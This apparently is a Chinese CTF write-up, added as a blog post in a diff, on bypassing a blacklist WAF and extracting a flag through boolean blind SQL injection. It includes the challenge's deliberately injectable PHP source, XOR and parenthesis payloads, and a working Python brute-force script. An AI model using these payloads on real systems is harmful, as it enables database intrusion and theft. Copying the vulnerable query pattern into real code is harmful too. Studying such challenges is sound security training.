@@ -1,0 +1,114 @@
+---
+layout: post
+title:  "2019-11-25-01"
+description: 无论你们做出什么选择,都将被载入史册;但是只有一个决定,将会创造历史
+date:   2019-11-25
+tags: waf绕过 sql布尔盲注
+excerpt_separator: ~~~
+---
+1.绕过WAF(括号代替空格,^表示异或,代替and和or)
+
+2.sql注入之布尔盲注
+
+~~~
+题目中只有一个页面，需要提交id。
+
+![My helpful screenshot](/assets/img/2019-11-25-01/1.png)
+
+id为1,2时，可以分别得到一句话。id为0时，显示error，可能是因为结果为空集。
+```
+id=1
+Hello, glzjin wants a girlfriend.
+id=2
+Do you want to be my girlfriend?
+```
+id提交为单个字母之类的会返回false,很有可能是用bool注入.单引号返回false，填入空格会直接显示SQL Injection Checked。这说明id除有过滤，空格被过滤了，但是单引号没过滤。
+
+尝试用Tab代替空格，(同时发现()也可以代替空格)发现可以。
+
+接下来根据题目中的提示构造payload：
+
+1   union    select  flag    from    flag
+被过滤了，直接输入一个
+
+1   union
+也会被过滤
+
+这说明union也被过滤了。最后测试发现select和from，括号没有被过滤可以考虑使用函数。
+
+有幸找到了这题的源码，在这里放一下，看看究竟过滤了啥。(清楚过滤的内容)
+```php
+<?php
+$dbuser='root';
+$dbpass='root';
+
+function safe($sql){
+    #被过滤的内容 函数基本没过滤
+    $blackList = array(' ','||','#','-',';','&','+','or','and','`','"','insert','group','limit','update','delete','*','into','union','load_file','outfile','./');
+    foreach($blackList as $blackitem){
+        if(stripos($sql,$blackitem)){
+            return False;
+        }
+    }
+    return True;
+}
+if(isset($_POST['id'])){
+    $id = $_POST['id'];
+}else{
+    die();
+}
+$db = mysql_connect("localhost",$dbuser,$dbpass);
+if(!$db){
+    die(mysql_error());
+}   
+mysql_select_db("ctf",$db);
+
+if(safe($id)){
+    $query = mysql_query("SELECT content from passage WHERE id = ${id} limit 0,1");
+    
+    if($query){
+        $result = mysql_fetch_array($query);
+        
+        if($result){
+            echo $result['content'];
+        }else{
+            echo "Error Occured When Fetch Result.";
+        }
+    }else{
+        var_dump($query);
+    }
+}else{
+    die("SQL Injection Checked.");
+}
+```
+通过测试可得
+```
+过滤空格、||、*、+、-
+可以用如下逻辑 1%1 1/1 1^1
+空格可以用()替代
+```
+接下来采取bool盲注
+```python
+import requests
+import string
+
+url="http://364aaec1-065b-42c1-97bf-e280f576346a.node2.buuoj.cn.wetolink.com/index.php"
+temp=''
+str1=string.printable
+for i in range(1,12):
+    for a in str1:
+        data={
+            'id':f'1^(ascii(substr((select(flag)from(flag)),{i},1))={ord(a)})'
+        }
+        rep= requests.post(url=url,data=data)
+        print(data)
+        if 'Occured' in rep.text:
+            temp+=a
+            print('[+] output: '+temp)
+            break
+ #flag{98cf8686-c4df-4a83-ba2c-eeb9c1dd2a3e}
+ ```
+## 知识点:
+ 1.绕过WAF(括号代替空格,^表示异或,代替and和or)
+
+ 2.sql注入之布尔盲注
